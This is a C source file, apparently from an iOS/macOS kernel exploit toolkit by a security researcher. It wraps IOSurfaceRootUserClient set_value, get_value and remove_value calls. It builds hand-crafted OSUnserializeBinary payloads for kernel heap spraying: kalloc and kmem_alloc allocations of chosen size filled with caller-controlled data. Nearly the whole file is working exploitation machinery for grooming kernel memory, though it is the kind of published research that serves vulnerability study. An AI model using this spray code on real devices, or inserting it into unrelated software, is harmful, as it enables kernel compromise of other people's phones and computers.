/*
 * iosurface.c
 * Brandon Azad
 */
#define IOSURFACE_EXTERN
#include "iosurface.h"

#include <assert.h>
#include <pthread.h>

#include "IOKitLib.h"
#include "OSSerializeBinary.h"
#include "log.h"
#include "platform.h"

// ---- IOSurface types ---------------------------------------------------------------------------

struct _IOSurfaceFastCreateArgs {
	uint64_t address;
	uint32_t width;
	uint32_t height;
	uint32_t pixel_format;
	uint32_t bytes_per_element;
	uint32_t bytes_per_row;
	uint32_t alloc_size;
};

struct IOSurfaceLockResult {
	uint8_t _pad1[0x18];
	uint32_t surface_id;
	uint8_t _pad2[0xdd0-0x18-0x4];
};

struct IOSurfaceValueArgs {
	uint32_t surface_id;
	uint32_t field_4;
	union {
		uint32_t xml[0];
		char string[0];
	};
};

struct IOSurfaceValueResultArgs {
	uint32_t field_0;
};

// ---- Global variables --------------------------------------------------------------------------

// Is the IOSurface subsystem initialized?
static bool IOSurface_initialized;

// ---- Initialization ----------------------------------------------------------------------------

bool
IOSurface_init() {
	if (IOSurface_initialized) {
		return true;
	}
	IOSurfaceRoot = IOServiceGetMatchingService(
			kIOMasterPortDefault,
			IOServiceMatching("IOSurfaceRoot"));
	if (IOSurfaceRoot == MACH_PORT_NULL) {
		ERROR("could not find %s", "IOSurfaceRoot");
		return false;
	}
	kern_return_t kr = IOServiceOpen(
			IOSurfaceRoot,
			mach_task_self(),
			0,
			&IOSurfaceRootUserClient);
	if (kr != KERN_SUCCESS) {
		ERROR("could not open %s", "IOSurfaceRootUserClient");
		return false;
	}
	struct _IOSurfaceFastCreateArgs create_args = { .alloc_size = (uint32_t) page_size };
	struct IOSurfaceLockResult lock_result;
	size_t lock_result_size = sizeof(lock_result);
	kr = IOConnectCallMethod(
			IOSurfaceRootUserClient,
			6, // create_surface_client_fast_path
			NULL, 0,
			&create_args, sizeof(create_args),
			NULL, NULL,
			&lock_result, &lock_result_size);
	if (kr != KERN_SUCCESS) {
		ERROR("could not create %s: 0x%x", "IOSurfaceClient", kr);
		return false;
	}
	IOSurface_id = lock_result.surface_id;
	IOSurface_initialized = true;
	return true;
}

void
IOSurface_deinit() {
	assert(IOSurface_initialized);
	IOSurface_initialized = false;
	IOSurface_id = 0;
	IOServiceClose(IOSurfaceRootUserClient);
	IOObjectRelease(IOSurfaceRoot);
}

// ---- External methods --------------------------------------------------------------------------

/*
 * IOSurface_set_value
 *
 * Description:
 * 	A wrapper around IOSurfaceRootUserClient::set_value().
 */
static bool
IOSurface_set_value(const struct IOSurfaceValueArgs *args, size_t args_size) {
	struct IOSurfaceValueResultArgs result;
	size_t result_size = sizeof(result);
	kern_return_t kr = IOConnectCallMethod(
			IOSurfaceRootUserClient,
			9, // set_value
			NULL, 0,
			args, args_size,
			NULL, NULL,
			&result, &result_size);
	if (kr != KERN_SUCCESS) {
		ERROR("Failed to %s value in %s: 0x%x", "set", "IOSurface", kr);
		return false;
	}
	return true;
}

/*
 * IOSurface_get_value
 *
 * Description:
 * 	A wrapper around IOSurfaceRootUserClient::get_value().
 */
__attribute__((unused))
static bool
IOSurface_get_value(const struct IOSurfaceValueArgs *in, size_t in_size,
		struct IOSurfaceValueArgs *out, size_t *out_size) {
	kern_return_t kr = IOConnectCallMethod(
			IOSurfaceRootUserClient,
			10, // get_value
			NULL, 0,
			in, in_size,
			NULL, NULL,
			out, out_size);
	if (kr != KERN_SUCCESS) {
		ERROR("Failed to %s value in %s: 0x%x", "get", "IOSurface", kr);
		return false;
	}
	return true;
}

/*
 * IOSurface_remove_value
 *
 * Description:
 * 	A wrapper around IOSurfaceRootUserClient::remove_value().
 */
static bool
IOSurface_remove_value(const struct IOSurfaceValueArgs *args, size_t args_size) {
	struct IOSurfaceValueResultArgs result;
	size_t result_size = sizeof(result);
	kern_return_t kr = IOConnectCallMethod(
			IOSurfaceRootUserClient,
			11, // remove_value
			NULL, 0,
			args, args_size,
			NULL, NULL,
			&result, &result_size);
	if (kr != KERN_SUCCESS) {
		ERROR("Failed to %s value in %s: 0x%x", "remove", "IOSurface", kr);
		return false;
	}
	return true;
}

// ---- Property encoding -------------------------------------------------------------------------

/*
 * base255_encode
 *
 * Description:
 * 	Encode a 32-bit integer so that it does not contain any null bytes.
 */
static uint32_t
base255_encode(uint32_t value) {
	uint32_t encoded = 0;
	for (unsigned i = 0; i < sizeof(value); i++) {
		encoded |= ((value % 255) + 1) << (8 * i);
		value /= 255;
	}
	return encoded;
}

uint32_t
IOSurface_property_key(uint32_t property_index) {
	assert(property_index <= MAX_IOSURFACE_PROPERTY_INDEX);
	uint32_t encoded = base255_encode(property_index);
	assert((encoded >> 24) == 0x01);
	return encoded & ~0xff000000;
}

// ---- IOSurface_remove_property -----------------------------------------------------------------

bool
IOSurface_remove_property(uint32_t property_key) {
	assert(IOSurface_initialized);
	struct {
		struct IOSurfaceValueArgs header;
		uint32_t key;
	} args;
	args.header.surface_id = IOSurface_id;
	args.key = property_key;
	return IOSurface_remove_value(&args.header, sizeof(args));
}

// ---- IOSurface_kalloc_fast ---------------------------------------------------------------------

bool
IOSurface_kalloc_fast(uint32_t property_key, size_t kalloc_size) {
	assert(kalloc_size <= 0x10000000);
	// Make sure our IOSurface is initialized.
	bool ok = IOSurface_init();
	if (!ok) {
		return false;
	}
	// OSDictionary::initWithCapacity() will create a kalloc allocation of size 16 * capacity.
	// However, we're constrained by OSUnserializeBinary() to a maximum capacity value of
	// 0x00ffffff.
	kalloc_size = (kalloc_size + 0xf) & ~0xf;
	uint32_t capacity = (uint32_t) (kalloc_size / 16);
	if (capacity > 0x00ffffff) {
		capacity = 0x00ffffff;
	}
	// IOSurfaceRootUserClient::set_value() expects a serialized OSArray containing 2 elements:
	// the property value at index 0 and the property key at index 1.
	struct {
		struct IOSurfaceValueArgs header;
		uint32_t xml[8];
	} args;
	args.header.surface_id = IOSurface_id;
	args.xml[0] = kOSSerializeBinarySignature;
	args.xml[1] = kOSSerializeArray | 2 | kOSSerializeEndCollecton;			// <array capacity="2">
	args.xml[2] = kOSSerializeDictionary | capacity;				//   <dict capacity="capacity">
	args.xml[3] = kOSSerializeSymbol | 2;						//     <sym len="2">
	args.xml[4] = 0xaa0000bb;							//       \xbb</sym>
	args.xml[5] = kOSSerializeBoolean | kOSSerializeEndCollecton;			//     <false/></dict>
	args.xml[6] = kOSSerializeSymbol | sizeof(uint32_t) | kOSSerializeEndCollecton;	//   <sym len="4">
	args.xml[7] = property_key;							//     key</sym></array>
	ok = IOSurface_set_value(&args.header, sizeof(args));
	return ok;
}

// ---- IOSurface_kmem_alloc_fast -----------------------------------------------------------------

static size_t
xml_units_for_size(size_t size) {
	return (size + sizeof(uint32_t) - 1) / sizeof(uint32_t);
}

size_t
IOSurface_kmem_alloc_fast_buffer_size(size_t kmem_alloc_size) {
	if (kmem_alloc_size < page_size || kmem_alloc_size > 0xffffff) {
		return 0;
	}
	size_t header_size = sizeof(struct IOSurfaceValueArgs);
	size_t data_units = xml_units_for_size(kmem_alloc_size);
	// Magic + Array(2) + Data(size) + DATA + Sym(1) + SYM
	return header_size + (1 + 1 + 1 + data_units + 1 + 1) * sizeof(uint32_t);
}

bool
IOSurface_kmem_alloc_fast_prepare(
		size_t kmem_alloc_size,
		void *kmem_alloc_fast_buffer,
		size_t *kmem_alloc_fast_buffer_size,
		void (^initialize_data)(void *data)) {
	// OSData::initWithCapacity() will create a kmem_alloc allocation of the specified
	// capacity. However, we're constrained by OSUnserializeBinary() to a maximum length of
	// 0x00ffffff.
	assert(page_size <= kmem_alloc_size && kmem_alloc_size <= 0xffffff);
	if (kmem_alloc_size < page_size || kmem_alloc_size > 0xffffff) {
		return false;
	}
	// Check that the buffer size is at least the minimum.
	size_t exact_size = IOSurface_kmem_alloc_fast_buffer_size(kmem_alloc_size);
	size_t buffer_size = *kmem_alloc_fast_buffer_size;
	*kmem_alloc_fast_buffer_size = exact_size;
	if (buffer_size < exact_size) {
		return false;
	}
	// IOSurfaceRootUserClient::set_value() expects a serialized OSArray containing 2 elements:
	// the property value at index 0 and the property key at index 1.
	struct IOSurfaceValueArgs *args = kmem_alloc_fast_buffer;
	uint32_t *xml = args->xml;
	*xml++ = kOSSerializeBinarySignature;
	*xml++ = kOSSerializeArray | 2 | kOSSerializeEndCollecton;			// <array capacity="2">
	*xml++ = kOSSerializeData | (uint32_t) kmem_alloc_size;				//   <data len="size">
	initialize_data(xml);								//     ...
	xml   += xml_units_for_size(kmem_alloc_size);					//   </data>
	*xml++ = kOSSerializeSymbol | sizeof(uint32_t) | kOSSerializeEndCollecton;	//   <sym len="4">
	args->field_4 = (uint32_t) (xml - args->xml);					//     ...
	xml++;										//   </sym></array>
	// Verify the size.
	size_t size = ((uint8_t *) xml - (uint8_t *) args);
	assert(size == exact_size);
	return true;
}

bool
IOSurface_kmem_alloc_fast(uint32_t property_key,
		void *kmem_alloc_fast_buffer, size_t kmem_alloc_fast_buffer_size) {
	// Make sure our IOSurface is initialized.
	bool ok = IOSurface_init();
	if (!ok) {
		return false;
	}
	// Set the IOSurface ID and initialize the property index in the XML.
	struct IOSurfaceValueArgs *args = kmem_alloc_fast_buffer;
	args->surface_id = IOSurface_id;
	args->xml[args->field_4] = property_key;
	// Call IOSurfaceRootUserClient::set_value().
	return IOSurface_set_value(args, kmem_alloc_fast_buffer_size);
}

// ---- IOSurface_kmem_alloc_array_fast -----------------------------------------------------------

size_t
IOSurface_kmem_alloc_array_fast_buffer_size(size_t kmem_alloc_size, size_t kmem_alloc_count) {
	if (kmem_alloc_size < page_size || kmem_alloc_size > 0xffffff) {
		return 0;
	}
	size_t header_size = sizeof(struct IOSurfaceValueArgs);
	size_t data_units = xml_units_for_size(kmem_alloc_size);
	// Magic + Array(2) + Array(count) + count * (Data(size) + DATA) + Sym(1) + SYM
	return header_size + (3 + kmem_alloc_count * (1 + data_units) + 2) * sizeof(uint32_t);
}

bool
IOSurface_kmem_alloc_array_fast_prepare(
		size_t kmem_alloc_size,
		size_t kmem_alloc_count,
		void *kmem_alloc_array_fast_buffer,
		size_t *kmem_alloc_array_fast_buffer_size,
		void (^initialize_data)(void *data, size_t index)) {
	// OSData::initWithCapacity() will create a kmem_alloc allocation of the specified
	// capacity. However, we're constrained by OSUnserializeBinary() to a maximum length of
	// 0x00ffffff for both the OSData and the OSArray.
	assert(page_size <= kmem_alloc_size && kmem_alloc_size <= 0xffffff
			&& kmem_alloc_count <= 0xffffff);
	if (kmem_alloc_size < page_size || kmem_alloc_size > 0xffffff
			|| kmem_alloc_count > 0xffffff) {
		return false;
	}
	// Check that the buffer size is at least the minimum.
	size_t exact_size = IOSurface_kmem_alloc_array_fast_buffer_size(
			kmem_alloc_size, kmem_alloc_count);
	size_t buffer_size = *kmem_alloc_array_fast_buffer_size;
	*kmem_alloc_array_fast_buffer_size = exact_size;
	if (buffer_size < exact_size) {
		return false;
	}
	// IOSurfaceRootUserClient::set_value() expects a serialized OSArray containing 2 elements:
	// the property value at index 0 and the property key at index 1.
	struct IOSurfaceValueArgs *args = kmem_alloc_array_fast_buffer;
	uint32_t *xml = args->xml;
	*xml++ = kOSSerializeBinarySignature;
	*xml++ = kOSSerializeArray | 2 | kOSSerializeEndCollecton;			// <array capacity="2">
	*xml++ = kOSSerializeArray | (uint32_t) kmem_alloc_count;			//   <array len="count">
	for (size_t i = 0; i < kmem_alloc_count; i++) {					//     <!-- count copies -->
		uint32_t flags = (i == kmem_alloc_count - 1 ? kOSSerializeEndCollecton : 0);	//     <!-- ends array -->
		*xml++ = kOSSerializeData | (uint32_t) kmem_alloc_size | flags;		//     <data len="size">
		initialize_data(xml, i);						//       ...
		xml   += xml_units_for_size(kmem_alloc_size);				//     </data>
	}										//   </array>
	*xml++ = kOSSerializeSymbol | sizeof(uint32_t) | kOSSerializeEndCollecton;	//   <sym len="4">
	args->field_4 = (uint32_t) (xml - args->xml);					//     ...
	xml++;										//   </sym></array>
	// Verify the size.
	size_t size = ((uint8_t *) xml - (uint8_t *) args);
	assert(size == exact_size);
	return true;
}

bool
IOSurface_kmem_alloc_array_fast(uint32_t property_key,
		void *kmem_alloc_array_fast_buffer, size_t kmem_alloc_array_fast_buffer_size) {
	// Make sure our IOSurface is initialized.
	bool ok = IOSurface_init();
	if (!ok) {
		return false;
	}
	// Set the IOSurface ID and initialize the property index in the XML.
	struct IOSurfaceValueArgs *args = kmem_alloc_array_fast_buffer;
	args->surface_id = IOSurface_id;
	args->xml[args->field_4] = property_key;
	// Call IOSurfaceRootUserClient::set_value().
	return IOSurface_set_value(args, kmem_alloc_array_fast_buffer_size);
}

// ---- Convenience API ---------------------------------------------------------------------------

// Compute the number of elements to spray for IOSurface_kmem_alloc_array_fast_().
static size_t
IOSurface_kmem_alloc_array_fast_count_(size_t kmem_alloc_size, size_t spray_size) {
	size_t alloc_size = (kmem_alloc_size + (page_size - 1)) & ~(page_size - 1);
	return (spray_size + alloc_size - 1) / alloc_size;
}

bool
IOSurface_kmem_alloc_array_fast_prepare_(
		size_t kmem_alloc_size,
		size_t spray_size,
		void *kmem_alloc_array_fast_buffer,
		size_t *kmem_alloc_array_fast_buffer_size,
		void (^initialize_data)(void *data, size_t index)) {
	assert(kmem_alloc_size <= spray_size && spray_size <= *kmem_alloc_array_fast_buffer_size);
	size_t count = IOSurface_kmem_alloc_array_fast_count_(kmem_alloc_size, spray_size);
	return IOSurface_kmem_alloc_array_fast_prepare(
			kmem_alloc_size,
			count,
			kmem_alloc_array_fast_buffer,
			kmem_alloc_array_fast_buffer_size,
			initialize_data);
}
